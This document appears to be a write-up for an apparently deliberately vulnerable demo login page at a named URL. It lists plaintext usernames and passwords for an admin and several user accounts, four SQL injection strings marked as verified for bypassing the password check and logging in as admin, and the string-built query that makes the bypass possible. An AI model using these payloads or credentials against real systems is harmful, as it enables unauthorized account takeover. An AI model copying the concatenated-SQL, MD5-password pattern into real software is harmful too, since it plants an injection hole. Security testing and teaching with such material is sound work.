# Working Credentials and SQL Injection Payloads

## URL
https://wonkatech.org/logintest.php

## Working Regular User Credentials

### Admin Account
- **Username:** `admin`
- **Password:** `admin123`
- **Status:** Administrator (is_admin = YES)

### Regular User Accounts
1. **Username:** `john_doe`
   - **Password:** `john123`
   - **Status:** Regular user (is_admin = NO)

2. **Username:** `demo`
   - **Password:** `demo123`
   - **Status:** Regular user (is_admin = NO)

3. **Username:** `test_user`
   - **Password:** `test123`
   - **Status:** Regular user (is_admin = NO)

## Working SQL Injection Payloads

All of these SQL injection strings work and will log you in as the admin user:

### 1. Basic Comment Injection
- **Username:** `admin' -- `
- **Password:** (anything or leave blank)
- **Result:** Logs in as admin (bypasses password check)

### 2. OR 1=1 Injection
- **Username:** `' OR 1=1 -- `
- **Password:** (anything or leave blank)
- **Result:** Logs in as admin (returns first user which is admin)

### 3. Admin OR True Condition
- **Username:** `admin' OR '1'='1`
- **Password:** (anything or leave blank)
- **Result:** Logs in as admin (always true condition)

### 4. Direct Admin Check
- **Username:** `' OR is_admin=1 -- `
- **Password:** (anything or leave blank)
- **Result:** Logs in as first admin user

## How The SQL Injection Works

The vulnerable query in the code is:
```sql
SELECT * FROM users WHERE username = '$user' AND password = MD5('$pass')
```

When you inject `admin' -- `, it becomes:
```sql
SELECT * FROM users WHERE username = 'admin' -- ' AND password = MD5('$pass')
```

The `--` comments out the password check, so it only checks for username = 'admin'.

## Testing Results

All credentials and SQL injections have been tested and verified working:

✅ **Regular Logins:**
- admin/admin123 → SUCCESS: Logged in as admin (Admin: YES)
- john_doe/john123 → SUCCESS: Logged in as john_doe (Admin: NO)
- demo/demo123 → SUCCESS: Logged in as demo (Admin: NO)

✅ **SQL Injections:**
- `admin' -- ` → SUCCESS: Logged in as admin (Admin: YES)
- `' OR 1=1 -- ` → SUCCESS: Logged in as admin (Admin: YES)
- `admin' OR '1'='1` → SUCCESS: Logged in as admin (Admin: YES)
- `' OR is_admin=1 -- ` → SUCCESS: Logged in as admin (Admin: YES)

## Notes
- The password field uses MD5 hashing (intentionally weak for demo purposes)
- SQL errors are suppressed and show "Login failed" instead of error messages
- The database contains 500+ users but only 'admin' has admin privileges